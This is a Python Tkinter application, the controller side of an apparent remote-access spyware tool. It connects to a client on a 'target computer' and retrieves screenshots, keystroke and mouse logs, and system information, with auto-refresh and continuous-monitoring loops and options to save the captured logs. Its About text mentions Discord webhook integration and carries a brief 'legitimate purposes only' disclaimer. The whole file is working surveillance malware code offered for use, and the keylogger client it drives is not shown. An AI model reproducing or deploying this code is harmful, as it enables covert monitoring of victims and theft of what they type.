#!/usr/bin/env python3
"""
Remote Control Host Script
Runs on the control computer to manage and control the client
"""

import socket
import json
import base64
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import time
import requests
from PIL import Image, ImageTk
import io
import os
import sys

class RemoteControlHost:
    def __init__(self, client_ip="localhost", client_port=9999):
        self.client_ip = client_ip
        self.client_port = client_port
        self.socket = None
        self.connected = False
        
        # GUI setup
        self.root = tk.Tk()
        self.root.title("Remote Control Host")
        self.root.geometry("1200x800")
        self.setup_gui()
        
    def setup_gui(self):
        """Setup the GUI interface"""
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Connection frame
        conn_frame = ttk.LabelFrame(main_frame, text="Connection", padding=10)
        conn_frame.pack(fill=tk.X, pady=(0, 10))
        
        # IP and Port inputs
        ttk.Label(conn_frame, text="Client IP:").grid(row=0, column=0, sticky=tk.W, padx=(0, 5))
        self.ip_var = tk.StringVar(value=self.client_ip)
        self.ip_entry = ttk.Entry(conn_frame, textvariable=self.ip_var, width=20)
        self.ip_entry.grid(row=0, column=1, padx=(0, 10))
        
        ttk.Label(conn_frame, text="Port:").grid(row=0, column=2, sticky=tk.W, padx=(0, 5))
        self.port_var = tk.StringVar(value=str(self.client_port))
        self.port_entry = ttk.Entry(conn_frame, textvariable=self.port_var, width=10)
        self.port_entry.grid(row=0, column=3, padx=(0, 10))
        
        # Connect button
        self.connect_btn = ttk.Button(conn_frame, text="Connect", command=self.connect_to_client)
        self.connect_btn.grid(row=0, column=4, padx=(0, 10))
        
        # Status label
        self.status_label = ttk.Label(conn_frame, text="Disconnected", foreground="red")
        self.status_label.grid(row=0, column=5)
        
        # Control frame
        control_frame = ttk.LabelFrame(main_frame, text="Remote Control", padding=10)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Control buttons
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(fill=tk.X)
        
        self.screenshot_btn = ttk.Button(btn_frame, text="Get Screenshot", command=self.get_screenshot)
        self.screenshot_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.keystrokes_btn = ttk.Button(btn_frame, text="Get Keystrokes", command=self.get_keystrokes)
        self.keystrokes_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.system_info_btn = ttk.Button(btn_frame, text="System Info", command=self.get_system_info)
        self.system_info_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        # Disable buttons initially
        self.screenshot_btn.config(state=tk.DISABLED)
        self.keystrokes_btn.config(state=tk.DISABLED)
        self.system_info_btn.config(state=tk.DISABLED)
        
        # Display frame
        display_frame = ttk.Frame(main_frame)
        display_frame.pack(fill=tk.BOTH, expand=True)
        
        # Left panel for screenshot
        left_panel = ttk.LabelFrame(display_frame, text="Screenshot", padding=10)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        self.screenshot_label = ttk.Label(left_panel, text="No screenshot available")
        self.screenshot_label.pack(fill=tk.BOTH, expand=True)
        
        # Right panel for logs and info
        right_panel = ttk.Frame(display_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        # Keystrokes frame
        keystrokes_frame = ttk.LabelFrame(right_panel, text="Recent Activity", padding=10)
        keystrokes_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        self.keystrokes_text = scrolledtext.ScrolledText(keystrokes_frame, height=15, width=50)
        self.keystrokes_text.pack(fill=tk.BOTH, expand=True)
        
        # System info frame
        system_info_frame = ttk.LabelFrame(right_panel, text="System Information", padding=10)
        system_info_frame.pack(fill=tk.BOTH, expand=True)
        
        self.system_info_text = scrolledtext.ScrolledText(system_info_frame, height=10, width=50)
        self.system_info_text.pack(fill=tk.BOTH, expand=True)
        
        # Menu bar
        self.setup_menu()
        
    def setup_menu(self):
        """Setup menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Save Screenshot", command=self.save_screenshot)
        file_menu.add_command(label="Save Logs", command=self.save_logs)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Auto Refresh Screenshot", command=self.toggle_auto_refresh)
        tools_menu.add_command(label="Continuous Monitoring", command=self.toggle_continuous_monitoring)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)
    
    def connect_to_client(self):
        """Connect to the client"""
        try:
            self.client_ip = self.ip_var.get()
            self.client_port = int(self.port_var.get())
            
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((self.client_ip, self.client_port))
            
            self.connected = True
            self.status_label.config(text="Connected", foreground="green")
            self.connect_btn.config(text="Disconnect", command=self.disconnect_from_client)
            
            # Enable control buttons
            self.screenshot_btn.config(state=tk.NORMAL)
            self.keystrokes_btn.config(state=tk.NORMAL)
            self.system_info_btn.config(state=tk.NORMAL)
            
            messagebox.showinfo("Success", f"Connected to {self.client_ip}:{self.client_port}")
            
        except Exception as e:
            messagebox.showerror("Connection Error", f"Failed to connect: {e}")
            self.status_label.config(text="Connection Failed", foreground="red")
    
    def disconnect_from_client(self):
        """Disconnect from the client"""
        try:
            if self.socket:
                self.socket.close()
            
            self.connected = False
            self.status_label.config(text="Disconnected", foreground="red")
            self.connect_btn.config(text="Connect", command=self.connect_to_client)
            
            # Disable control buttons
            self.screenshot_btn.config(state=tk.DISABLED)
            self.keystrokes_btn.config(state=tk.DISABLED)
            self.system_info_btn.config(state=tk.DISABLED)
            
            messagebox.showinfo("Disconnected", "Disconnected from client")
            
        except Exception as e:
            messagebox.showerror("Disconnect Error", f"Error disconnecting: {e}")
    
    def send_command(self, command):
        """Send command to client"""
        if not self.connected or not self.socket:
            messagebox.showerror("Error", "Not connected to client")
            return None
        
        try:
            self.socket.send(json.dumps(command).encode('utf-8'))
            response = self.socket.recv(1024 * 1024)  # Large buffer for images
            return json.loads(response.decode('utf-8'))
        except Exception as e:
            messagebox.showerror("Communication Error", f"Failed to communicate with client: {e}")
            return None
    
    def get_screenshot(self):
        """Get screenshot from client"""
        command = {'type': 'screenshot'}
        response = self.send_command(command)
        
        if response and response.get('type') == 'screenshot':
            try:
                # Decode base64 image
                img_data = base64.b64decode(response['data'])
                img = Image.open(io.BytesIO(img_data))
                
                # Resize for display
                display_size = (800, 600)
                img.thumbnail(display_size, Image.Resampling.LANCZOS)
                
                # Convert to PhotoImage
                photo = ImageTk.PhotoImage(img)
                
                # Update label
                self.screenshot_label.config(image=photo, text="")
                self.screenshot_label.image = photo  # Keep a reference
                
                # Store full image for saving
                self.current_screenshot = img
                
            except Exception as e:
                messagebox.showerror("Image Error", f"Failed to display screenshot: {e}")
        else:
            messagebox.showerror("Error", "Failed to get screenshot from client")
    
    def get_keystrokes(self):
        """Get recent keystrokes from client"""
        command = {'type': 'keystrokes'}
        response = self.send_command(command)
        
        if response and response.get('type') == 'keystrokes':
            keystrokes = response.get('data', [])
            
            # Clear and update text
            self.keystrokes_text.delete(1.0, tk.END)
            
            if keystrokes:
                for stroke in keystrokes:
                    if stroke['type'] == 'keyboard':
                        self.keystrokes_text.insert(tk.END, 
                            f"⌨️ {stroke['timestamp']} - {stroke['key']} ({stroke['action']})\n")
                    elif stroke['type'] == 'mouse':
                        self.keystrokes_text.insert(tk.END,
                            f"🖱️ {stroke['timestamp']} - Mouse {stroke['button']} at ({stroke['x']}, {stroke['y']}) ({stroke['action']})\n")
                    elif stroke['type'] == 'scroll':
                        self.keystrokes_text.insert(tk.END,
                            f"📜 {stroke['timestamp']} - Scroll ({stroke['dx']}, {stroke['dy']}) at ({stroke['x']}, {stroke['y']})\n")
            else:
                self.keystrokes_text.insert(tk.END, "No recent activity recorded.\n")
        else:
            messagebox.showerror("Error", "Failed to get keystrokes from client")
    
    def get_system_info(self):
        """Get system information from client"""
        command = {'type': 'system_info'}
        response = self.send_command(command)
        
        if response and response.get('type') == 'system_info':
            info = response.get('data', {})
            
            # Clear and update text
            self.system_info_text.delete(1.0, tk.END)
            
            if info:
                self.system_info_text.insert(tk.END, f"Platform: {info.get('platform', 'Unknown')}\n")
                self.system_info_text.insert(tk.END, f"Version: {info.get('platform_version', 'Unknown')}\n")
                self.system_info_text.insert(tk.END, f"Processor: {info.get('processor', 'Unknown')}\n")
                self.system_info_text.insert(tk.END, f"CPU Usage: {info.get('cpu_percent', 'Unknown')}%\n\n")
                
                # Memory info
                memory = info.get('memory', {})
                if memory:
                    self.system_info_text.insert(tk.END, f"Memory Total: {memory.get('total', 0) // (1024**3):.1f} GB\n")
                    self.system_info_text.insert(tk.END, f"Memory Used: {memory.get('used', 0) // (1024**3):.1f} GB\n")
                    self.system_info_text.insert(tk.END, f"Memory Percent: {memory.get('percent', 0):.1f}%\n\n")
                
                # Disk info
                disk = info.get('disk_usage', {})
                if disk:
                    self.system_info_text.insert(tk.END, f"Disk Total: {disk.get('total', 0) // (1024**3):.1f} GB\n")
                    self.system_info_text.insert(tk.END, f"Disk Used: {disk.get('used', 0) // (1024**3):.1f} GB\n")
                    self.system_info_text.insert(tk.END, f"Disk Percent: {disk.get('percent', 0):.1f}%\n")
            else:
                self.system_info_text.insert(tk.END, "No system information available.\n")
        else:
            messagebox.showerror("Error", "Failed to get system information from client")
    
    def save_screenshot(self):
        """Save current screenshot to file"""
        if hasattr(self, 'current_screenshot'):
            try:
                from tkinter import filedialog
                filename = filedialog.asksaveasfilename(
                    defaultextension=".png",
                    filetypes=[("PNG files", "*.png"), ("All files", "*.*")]
                )
                if filename:
                    self.current_screenshot.save(filename)
                    messagebox.showinfo("Success", f"Screenshot saved to {filename}")
            except Exception as e:
                messagebox.showerror("Save Error", f"Failed to save screenshot: {e}")
        else:
            messagebox.showwarning("Warning", "No screenshot available to save")
    
    def save_logs(self):
        """Save logs to file"""
        try:
            from tkinter import filedialog
            filename = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            if filename:
                with open(filename, 'w') as f:
                    f.write("=== Keystrokes Log ===\n")
                    f.write(self.keystrokes_text.get(1.0, tk.END))
                    f.write("\n=== System Information ===\n")
                    f.write(self.system_info_text.get(1.0, tk.END))
                messagebox.showinfo("Success", f"Logs saved to {filename}")
        except Exception as e:
            messagebox.showerror("Save Error", f"Failed to save logs: {e}")
    
    def toggle_auto_refresh(self):
        """Toggle automatic screenshot refresh"""
        if hasattr(self, 'auto_refresh'):
            self.auto_refresh = not self.auto_refresh
            if self.auto_refresh:
                self.start_auto_refresh()
            else:
                self.stop_auto_refresh()
        else:
            self.auto_refresh = True
            self.start_auto_refresh()
    
    def start_auto_refresh(self):
        """Start automatic screenshot refresh"""
        def refresh_loop():
            while self.auto_refresh and self.connected:
                self.get_screenshot()
                time.sleep(10)  # Refresh every 10 seconds
        
        self.refresh_thread = threading.Thread(target=refresh_loop, daemon=True)
        self.refresh_thread.start()
        messagebox.showinfo("Auto Refresh", "Automatic screenshot refresh started")
    
    def stop_auto_refresh(self):
        """Stop automatic screenshot refresh"""
        self.auto_refresh = False
        messagebox.showinfo("Auto Refresh", "Automatic screenshot refresh stopped")
    
    def toggle_continuous_monitoring(self):
        """Toggle continuous monitoring"""
        if hasattr(self, 'continuous_monitoring'):
            self.continuous_monitoring = not self.continuous_monitoring
            if self.continuous_monitoring:
                self.start_continuous_monitoring()
            else:
                self.stop_continuous_monitoring()
        else:
            self.continuous_monitoring = True
            self.start_continuous_monitoring()
    
    def start_continuous_monitoring(self):
        """Start continuous monitoring"""
        def monitoring_loop():
            while self.continuous_monitoring and self.connected:
                self.get_keystrokes()
                self.get_system_info()
                time.sleep(30)  # Update every 30 seconds
        
        self.monitoring_thread = threading.Thread(target=monitoring_loop, daemon=True)
        self.monitoring_thread.start()
        messagebox.showinfo("Monitoring", "Continuous monitoring started")
    
    def stop_continuous_monitoring(self):
        """Stop continuous monitoring"""
        self.continuous_monitoring = False
        messagebox.showinfo("Monitoring", "Continuous monitoring stopped")
    
    def show_about(self):
        """Show about dialog"""
        about_text = """
Remote Control Host v1.0

A remote monitoring and control application.

Features:
- Real-time screenshot capture
- Keystroke and mouse activity monitoring
- System information gathering
- Discord webhook integration
- Continuous monitoring capabilities

Usage:
1. Run client_script.py on the target computer
2. Run this host script on your control computer
3. Enter the target computer's IP address
4. Click Connect to establish connection
5. Use the control buttons to monitor the target

Note: This tool is for legitimate remote administration purposes only.
        """
        messagebox.showinfo("About", about_text)
    
    def run(self):
        """Start the GUI application"""
        self.root.mainloop()

def main():
    # Create and run the host application
    host = RemoteControlHost()
    host.run()

if __name__ == "__main__":
    main()